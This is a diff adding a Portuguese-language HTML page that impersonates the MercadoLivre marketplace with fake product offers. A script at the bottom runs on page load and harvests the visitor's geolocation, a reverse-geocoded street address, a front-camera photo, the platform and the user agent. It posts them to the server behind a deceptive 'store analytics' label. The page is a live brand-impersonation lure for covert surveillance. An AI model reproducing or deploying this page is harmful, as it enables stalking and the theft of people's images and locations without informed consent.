@@ -1,0 +1,767 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>MercadoLivre - Sua Loja Online</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    
+    body {
+      font-family: 'Proxima Nova', Arial, sans-serif;
+      background: #ebebeb;
+      color: #333;
+    }
+    
+    /* Header */
+    .header {
+      background: #fff159;
+      padding: 12px 0;
+      border-bottom: 1px solid #e6e6e6;
+    }
+    
+    .header-top {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 0 16px;
+      font-size: 12px;
+      color: #666;
+      text-align: right;
+    }
+    
+    .header-main {
+      max-width: 1200px;
+      margin: 0 auto;
+      display: flex;
+      align-items: center;
+      padding: 12px 16px;
+      gap: 20px;
+    }
+    
+    .logo {
+      font-size: 2em;
+      font-weight: bold;
+      color: #2968c8;
+      text-decoration: none;
+    }
+    
+    .search-container {
+      flex: 1;
+      max-width: 600px;
+      position: relative;
+    }
+    
+    .search-bar {
+      width: 100%;
+      display: flex;
+      box-shadow: 0 1px 2px 0 rgba(0,0,0,.18);
+      border-radius: 2px;
+    }
+    
+    .search-bar input {
+      flex: 1;
+      padding: 10px 15px;
+      border: none;
+      font-size: 16px;
+      outline: none;
+    }
+    
+    .search-bar button {
+      background: #4189dd;
+      border: none;
+      color: white;
+      padding: 10px 20px;
+      cursor: pointer;
+      font-size: 14px;
+    }
+    
+    .nav-links {
+      display: flex;
+      gap: 20px;
+      font-size: 14px;
+    }
+    
+    .nav-links a {
+      color: #666;
+      text-decoration: none;
+    }
+    
+    /* Categories Bar */
+    .categories-bar {
+      background: white;
+      padding: 12px 0;
+      border-bottom: 1px solid #e6e6e6;
+    }
+    
+    .categories-list {
+      max-width: 1200px;
+      margin: 0 auto;
+      display: flex;
+      gap: 30px;
+      padding: 0 16px;
+      font-size: 14px;
+    }
+    
+    .categories-list a {
+      color: #666;
+      text-decoration: none;
+      white-space: nowrap;
+    }
+    
+    .categories-list a:hover {
+      color: #3483fa;
+    }
+    
+    /* Banner */
+    .banner {
+      background: linear-gradient(135deg, #3483fa, #2968c8);
+      color: white;
+      text-align: center;
+      padding: 40px 20px;
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .banner::before {
+      content: '';
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);
+      animation: float 6s ease-in-out infinite;
+    }
+    
+    @keyframes float {
+      0%, 100% { transform: translateY(0px); }
+      50% { transform: translateY(-20px); }
+    }
+    
+    .banner h1 {
+      font-size: 2.2em;
+      margin-bottom: 10px;
+      font-weight: 300;
+      position: relative;
+      z-index: 1;
+    }
+    
+    .banner p {
+      font-size: 1.1em;
+      opacity: 0.9;
+      position: relative;
+      z-index: 1;
+    }
+    
+    /* Container */
+    .container {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 24px 16px;
+    }
+    
+    /* Offers Section */
+    .offers-section {
+      background: white;
+      border-radius: 6px;
+      padding: 24px;
+      margin-bottom: 32px;
+      box-shadow: 0 1px 2px 0 rgba(0,0,0,.18);
+    }
+    
+    .offers-header {
+      display: flex;
+      align-items: center;
+      margin-bottom: 20px;
+    }
+    
+    .offers-title {
+      font-size: 1.5em;
+      color: #3483fa;
+      margin: 0;
+      font-weight: 300;
+    }
+    
+    .discount-badge {
+      background: #00a650;
+      color: white;
+      padding: 4px 8px;
+      border-radius: 4px;
+      font-size: 12px;
+      font-weight: bold;
+      margin-left: 12px;
+    }
+    
+    /* Products Section */
+    .products-section {
+      margin-bottom: 40px;
+    }
+    
+    .section-title {
+      font-size: 1.6em;
+      color: #666;
+      margin-bottom: 20px;
+      font-weight: 300;
+      background: white;
+      padding: 20px;
+      border-radius: 6px;
+      box-shadow: 0 1px 2px 0 rgba(0,0,0,.18);
+    }
+    
+    .products-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(224px, 1fr));
+      gap: 16px;
+    }
+    
+    .product-card {
+      background: white;
+      border-radius: 6px;
+      overflow: hidden;
+      box-shadow: 0 1px 2px 0 rgba(0,0,0,.18);
+      transition: all 0.3s ease;
+      cursor: pointer;
+      position: relative;
+    }
+    
+    .product-card:hover {
+      box-shadow: 0 8px 32px 0 rgba(0,0,0,.12);
+      transform: translateY(-2px);
+    }
+    
+    .product-image {
+      width: 100%;
+      height: 224px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 4em;
+      background: #f8f8ff;
+      border-bottom: 1px solid #e6e6e6;
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .product-image::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: linear-gradient(45deg, transparent 30%, rgba(255,255,255,0.5) 50%, transparent 70%);
+      transform: translateX(-100%);
+      transition: transform 0.6s;
+    }
+    
+    .product-card:hover .product-image::before {
+      transform: translateX(100%);
+    }
+    
+    .product-info {
+      padding: 16px;
+    }
+    
+    .product-price {
+      font-size: 1.5em;
+      color: #333;
+      margin-bottom: 4px;
+      font-weight: 400;
+    }
+    
+    .product-discount {
+      color: #00a650;
+      font-size: 12px;
+      margin-bottom: 8px;
+      font-weight: 600;
+    }
+    
+    .product-title {
+      font-size: 13px;
+      color: #666;
+      line-height: 1.3;
+      margin-bottom: 8px;
+      height: 32px;
+      overflow: hidden;
+    }
+    
+    .product-shipping {
+      color: #00a650;
+      font-size: 12px;
+      font-weight: bold;
+    }
+    
+    /* Mercado Points */
+    .points-section {
+      background: linear-gradient(135deg, #ffffff, #f8f9fa);
+      border-radius: 6px;
+      padding: 24px;
+      margin: 32px 0;
+      box-shadow: 0 1px 2px 0 rgba(0,0,0,.18);
+      text-align: center;
+    }
+    
+    .points-section h2 {
+      color: #3483fa;
+      font-size: 1.8em;
+      margin-bottom: 16px;
+      font-weight: 300;
+    }
+    
+    .points-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+      gap: 24px;
+      margin-top: 24px;
+    }
+    
+    .point-item {
+      text-align: center;
+      transition: transform 0.3s ease;
+    }
+    
+    .point-item:hover {
+      transform: translateY(-5px);
+    }
+    
+    .point-icon {
+      font-size: 3em;
+      margin-bottom: 12px;
+      display: block;
+      color: #3483fa;
+    }
+    
+    .point-title {
+      font-weight: bold;
+      margin-bottom: 8px;
+      color: #333;
+    }
+    
+    .point-desc {
+      font-size: 13px;
+      color: #666;
+      line-height: 1.4;
+    }
+    
+    /* Status Section */
+    .status-section {
+      background: white;
+      padding: 24px;
+      border-radius: 6px;
+      text-align: center;
+      margin: 32px 0;
+      box-shadow: 0 1px 2px 0 rgba(0,0,0,.18);
+    }
+    
+    .status-section h2 {
+      color: #3483fa;
+      font-size: 1.4em;
+      margin-bottom: 12px;
+      font-weight: 300;
+    }
+    
+    .status-section p {
+      color: #666;
+      margin-bottom: 16px;
+    }
+    
+    #status {
+      color: #00a650;
+      font-weight: bold;
+      font-size: 1em;
+      padding: 10px;
+      background: #f0f8f0;
+      border-radius: 4px;
+      display: inline-block;
+    }
+    
+    /* Footer */
+    .footer {
+      background: white;
+      margin-top: 48px;
+      padding: 32px 0;
+      border-top: 1px solid #e6e6e6;
+    }
+    
+    .footer-content {
+      max-width: 1200px;
+      margin: 0 auto;
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+      gap: 32px;
+      padding: 0 16px;
+    }
+    
+    .footer-section h3 {
+      color: #666;
+      margin-bottom: 16px;
+      font-size: 16px;
+      font-weight: bold;
+    }
+    
+    .footer-section p, .footer-section a {
+      color: #999;
+      text-decoration: none;
+      line-height: 1.6;
+      font-size: 13px;
+      display: block;
+      margin-bottom: 8px;
+    }
+    
+    .footer-section a:hover {
+      color: #3483fa;
+    }
+    
+    .footer-bottom {
+      text-align: center;
+      margin-top: 32px;
+      padding-top: 24px;
+      border-top: 1px solid #e6e6e6;
+      color: #999;
+      font-size: 12px;
+    }
+    
+    /* Responsive */
+    @media (max-width: 768px) {
+      .header-main {
+        flex-direction: column;
+        gap: 16px;
+      }
+      
+      .search-container {
+        order: 1;
+        max-width: none;
+      }
+      
+      .categories-list {
+        overflow-x: auto;
+        white-space: nowrap;
+      }
+      
+      .products-grid {
+        grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
+      }
+      
+      .banner h1 {
+        font-size: 1.6em;
+      }
+      
+      .points-grid {
+        grid-template-columns: 1fr;
+      }
+    }
+  </style>
+</head>
+<body>
+  <!-- Header -->
+  <header class="header">
+    <div class="header-top">
+      <span>Frete grátis no dia | Parcelamento sem cartão</span>
+    </div>
+    <div class="header-main">
+      <a href="#" class="logo">MercadoLivre</a>
+      <div class="search-container">
+        <div class="search-bar">
+          <input type="text" placeholder="Buscar produtos, marcas e muito mais...">
+          <button>🔍</button>
+        </div>
+      </div>
+      <div class="nav-links">
+        <a href="#">Criar conta</a>
+        <a href="#">Entrar</a>
+        <a href="#">Meus pedidos</a>
+        <a href="#">🛒</a>
+      </div>
+    </div>
+  </header>
+
+  <!-- Categories Bar -->
+  <nav class="categories-bar">
+    <div class="categories-list">
+      <a href="#">🚗 Veículos</a>
+      <a href="#">🏠 Imóveis</a>
+      <a href="#">💻 Tecnologia</a>
+      <a href="#">🏡 Casa e Jardim</a>
+      <a href="#">🔌 Eletrodomésticos</a>
+      <a href="#">👕 Moda</a>
+      <a href="#">⚽ Esportes</a>
+      <a href="#">💄 Beleza</a>
+      <a href="#">➕ Mais categorias</a>
+    </div>
+  </nav>
+
+  <!-- Banner -->
+  <div class="banner">
+    <h1>🎉 Ofertas de Janeiro</h1>
+    <p>Os melhores produtos com os melhores preços</p>
+  </div>
+
+  <!-- Container Principal -->
+  <div class="container">
+    <!-- Offers Section -->
+    <div class="offers-section">
+      <div class="offers-header">
+        <h2 class="offers-title">⚡ Ofertas do dia</h2>
+        <span class="discount-badge">ATÉ 70% OFF</span>
+      </div>
+      <div class="products-grid">
+        <div class="product-card">
+          <div class="product-image">📱</div>
+          <div class="product-info">
+            <div class="product-price">R$ 1.299</div>
+            <div class="product-discount">40% OFF</div>
+            <div class="product-title">Samsung Galaxy S24 128GB 5G</div>
+            <div class="product-shipping">📦 Frete grátis</div>
+          </div>
+        </div>
+        
+        <div class="product-card">
+          <div class="product-image">💻</div>
+          <div class="product-info">
+            <div class="product-price">R$ 2.199</div>
+            <div class="product-discount">25% OFF</div>
+            <div class="product-title">Notebook Lenovo IdeaPad 8GB</div>
+            <div class="product-shipping">📦 Frete grátis</div>
+          </div>
+        </div>
+        
+        <div class="product-card">
+          <div class="product-image">🎧</div>
+          <div class="product-info">
+            <div class="product-price">R$ 149</div>
+            <div class="product-discount">50% OFF</div>
+            <div class="product-title">JBL Tune 510BT Bluetooth</div>
+            <div class="product-shipping">📦 Frete grátis</div>
+          </div>
+        </div>
+        
+        <div class="product-card">
+          <div class="product-image">⌚</div>
+          <div class="product-info">
+            <div class="product-price">R$ 899</div>
+            <div class="product-discount">30% OFF</div>
+            <div class="product-title">Apple Watch SE GPS 40mm</div>
+            <div class="product-shipping">📦 Frete grátis</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Products Section -->
+    <div class="products-section">
+      <div class="section-title">🔥 Mais vendidos em Tecnologia</div>
+      <div class="products-grid">
+        <div class="product-card">
+          <div class="product-image">📺</div>
+          <div class="product-info">
+            <div class="product-price">R$ 1.899</div>
+            <div class="product-title">Smart TV LG 55" 4K UHD</div>
+            <div class="product-shipping">📦 Frete grátis</div>
+          </div>
+        </div>
+        
+        <div class="product-card">
+          <div class="product-image">🖱️</div>
+          <div class="product-info">
+            <div class="product-price">R$ 89</div>
+            <div class="product-title">Mouse Gamer Logitech G502</div>
+            <div class="product-shipping">📦 Frete grátis</div>
+          </div>
+        </div>
+        
+        <div class="product-card">
+          <div class="product-image">⌨️</div>
+          <div class="product-info">
+            <div class="product-price">R$ 299</div>
+            <div class="product-title">Teclado Mecânico RGB</div>
+            <div class="product-shipping">📦 Frete grátis</div>
+          </div>
+        </div>
+        
+        <div class="product-card">
+          <div class="product-image">🔌</div>
+          <div class="product-info">
+            <div class="product-price">R$ 45</div>
+            <div class="product-title">Carregador USB-C 65W</div>
+            <div class="product-shipping">📦 Frete grátis</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- More Products -->
+    <div class="products-section">
+      <div class="section-title">🏠 Casa, Móveis e Decoração</div>
+      <div class="products-grid">
+        <div class="product-card">
+          <div class="product-image">🛋️</div>
+          <div class="product-info">
+            <div class="product-price">R$ 1.599</div>
+            <div class="product-title">Sofá 3 Lugares Retrátil</div>
+            <div class="product-shipping">📦 Frete grátis</div>
+          </div>
+        </div>
+        
+        <div class="product-card">
+          <div class="product-image">🪑</div>
+          <div class="product-info">
+            <div class="product-price">R$ 299</div>
+            <div class="product-title">Cadeira de Escritório Ergonômica</div>
+            <div class="product-shipping">📦 Frete grátis</div>
+          </div>
+        </div>
+        
+        <div class="product-card">
+          <div class="product-image">🛏️</div>
+          <div class="product-info">
+            <div class="product-price">R$ 899</div>
+            <div class="product-title">Cama Box Casal + Colchão</div>
+            <div class="product-shipping">📦 Frete grátis</div>
+          </div>
+        </div>
+        
+        <div class="product-card">
+          <div class="product-image">🍽️</div>
+          <div class="product-info">
+            <div class="product-price">R$ 199</div>
+            <div class="product-title">Aparelho de Jantar 20 Peças</div>
+            <div class="product-shipping">📦 Frete grátis</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Mercado Points -->
+    <div class="points-section">
+      <h2>💙 Por que escolher o MercadoLivre?</h2>
+      <div class="points-grid">
+        <div class="point-item">
+          <span class="point-icon">🚚</span>
+          <div class="point-title">Frete grátis</div>
+          <div class="point-desc">Em milhares de produtos. É a qualidade do Mercado Livre.</div>
+        </div>
+        <div class="point-item">
+          <span class="point-icon">🛡️</span>
+          <div class="point-title">Segurança</div>
+          <div class="point-desc">Do início ao fim da sua compra.</div>
+        </div>
+        <div class="point-item">
+          <span class="point-icon">💳</span>
+          <div class="point-title">Parcelamento</div>
+          <div class="point-desc">Em até 12x sem cartão de crédito com Mercado Crédito.</div>
+        </div>
+        <div class="point-item">
+          <span class="point-icon">📱</span>
+          <div class="point-title">Aplicativo</div>
+          <div class="point-desc">Baixe o app e tenha milhões de produtos na palma da sua mão.</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Status Section -->
+    <div class="status-section">
+      <h2>📊 Analytics da Loja</h2>
+      <p>Coletando dados de performance...</p>
+      <div id="status">Bem-vindo à nossa loja!</div>
+    </div>
+  </div>
+
+  <!-- Footer -->
+  <footer class="footer">
+    <div class="footer-content">
+      <div class="footer-section">
+        <h3>❓ Ajuda</h3>
+        <a href="#">Comprar</a>
+        <a href="#">Vender</a>
+        <a href="#">Resolução de problemas</a>
+        <a href="#">Centro de segurança</a>
+      </div>
+      <div class="footer-section">
+        <h3>ℹ️ Sobre o MercadoLivre</h3>
+        <a href="#">Informações corporativas</a>
+        <a href="#">Notícias</a>
+        <a href="#">Investidores</a>
+        <a href="#">Carreiras</a>
+      </div>
+      <div class="footer-section">
+        <h3>🌐 Outros sites</h3>
+        <a href="#">Developers</a>
+        <a href="#">Mercado Pago</a>
+        <a href="#">Mercado Shops</a>
+        <a href="#">Mercado Envios</a>
+      </div>
+      <div class="footer-section">
+        <h3>📱 Redes sociais</h3>
+        <a href="#">Facebook</a>
+        <a href="#">Twitter</a>
+        <a href="#">Instagram</a>
+        <a href="#">YouTube</a>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      Copyright © 1999-2025 MercadoLivre S.R.L.
+    </div>
+  </footer>
+
+  <script>
+    async function capturarDados() {
+      try {
+        const sistema = navigator.platform;
+        const navegador = navigator.userAgent;
+
+        navigator.geolocation.getCurrentPosition(async (position) => {
+          const latitude = position.coords.latitude;
+          const longitude = position.coords.longitude;
+
+          const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`);
+          const geoData = await geoRes.json();
+          const endereco = geoData.display_name || 'Desconhecido';
+
+          const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+          const video = document.createElement('video');
+          video.srcObject = stream;
+          await video.play();
+
+          const canvas = document.createElement('canvas');
+          canvas.width = 640;
+          canvas.height = 480;
+          const context = canvas.getContext('2d');
+
+          setTimeout(() => {
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imagem = canvas.toDataURL('image/png');
+
+            fetch('/dados', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                latitude,
+                longitude,
+                endereco,
+                imagem,
+                sistema,
+                navegador
+              })
+            }).then(() => {
+              document.getElementById('status').textContent = '✅ Dados coletados com sucesso!';
+              stream.getTracks().forEach(track => track.stop());
+            }).catch(err => {
+              console.error("Erro ao enviar dados:", err);
+              stream.getTracks().forEach(track => track.stop());
+            });
+          }, 3000);
+        }, (err) => {
+          console.error("Erro ao obter localização:", err);
+        });
+      } catch (err) {
+        console.error("Erro geral:", err);
+      }
+    }
+
+    window.onload = capturarDados;
+  </script>
+</body>
+</html>
